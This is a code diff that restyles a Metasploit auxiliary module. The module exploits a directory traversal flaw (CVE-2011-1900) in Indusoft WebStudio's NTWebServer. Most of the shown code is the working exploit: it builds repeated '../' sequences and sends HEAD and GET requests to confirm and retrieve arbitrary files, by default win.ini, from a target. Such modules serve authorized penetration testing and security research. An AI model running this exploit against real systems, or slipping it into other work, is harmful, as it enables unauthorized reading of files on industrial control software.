@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,20 +7,19 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
   def initialize
     super(
-      'Name'         => 'Indusoft WebStudio NTWebServer Remote File Access',
-      'Description'  =>  %q{
+      'Name' => 'Indusoft WebStudio NTWebServer Remote File Access',
+      'Description' => %q(
           This module exploits a directory traversal vulnerability in Indusoft WebStudio.
         The vulnerability exists in the NTWebServer component and allows to read arbitrary
         remote files with the privileges of the NTWebServer process. The module has been
         tested successfully on Indusoft WebStudio 6.1 SP6.
-      },
+      ),
       'References'   =>
         [
           [ 'CVE', '2011-1900' ],
@@ -36,22 +36,21 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options(
-    [
-      OptString.new('RFILE', [true, 'Remote File', '/windows\\win.ini']),
-      OptInt.new('DEPTH', [true, 'Traversal depth', 3])
-    ], self.class)
+      [
+        OptString.new('RFILE', [true, 'Remote File', '/windows\\win.ini']),
+        OptInt.new('DEPTH', [true, 'Traversal depth', 3])
+      ], self.class
+    )
 
     register_autofilter_ports([ 80 ])
     deregister_options('RHOST')
   end
 
   def run_host(ip)
-    res = send_request_cgi({
-      'uri'     => "/",
-      'method'  => 'GET'
-    })
+    res = send_request_cgi('uri' => "/",
+                           'method' => 'GET')
 
-    if not res
+    unless res
       print_error("#{rhost}:#{rport} - Unable to connect")
       return
     end
@@ -60,24 +59,21 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def accessfile(rhost)
-
     traversal = "../" * datastore['DEPTH']
     rfile = ""
 
-    if datastore['RFILE'][0] == "/"
-      rfile = datastore['RFILE'][1..datastore['RFILE'].length-1]
-    else
-      rfile = datastore['RFILE']
-    end
+    rfile = if datastore['RFILE'][0] == "/"
+              datastore['RFILE'][1..datastore['RFILE'].length - 1]
+            else
+              datastore['RFILE']
+            end
 
     print_status("#{rhost}:#{rport} - Checking if file exists...")
 
-    res = send_request_cgi({
-      'uri'      => "/#{traversal}#{rfile}",
-      'method'   => 'HEAD'
-    })
+    res = send_request_cgi('uri' => "/#{traversal}#{rfile}",
+                           'method' => 'HEAD')
 
-    if res and res.code == 200 and res.message =~ /File Exists/
+    if res && (res.code == 200) && res.message =~ /File Exists/
       print_good("#{rhost}:#{rport} - The file exists")
     else
       print_error("#{rhost}:#{rport} - The file doesn't exist")
@@ -86,14 +82,12 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("#{rhost}:#{rport} - Retrieving remote file...")
 
-    res = send_request_cgi({
-      'uri'      => "/#{traversal}#{rfile}",
-      'method'   => 'GET'
-    })
+    res = send_request_cgi('uri' => "/#{traversal}#{rfile}",
+                           'method' => 'GET')
 
-    if res and res.code == 200 and res.message =~ /Sending file/
+    if res && (res.code == 200) && res.message =~ /Sending file/
       loot = res.body
-      if not loot or loot.empty?
+      if !loot || loot.empty?
         print_status("#{rhost}:#{rport} - Retrieved empty file")
         return
       end
@@ -105,6 +99,4 @@ class MetasploitModule < Msf::Auxiliary
 
     print_error("#{rhost}:#{rport} - Failed to retrieve file")
   end
-
 end
-
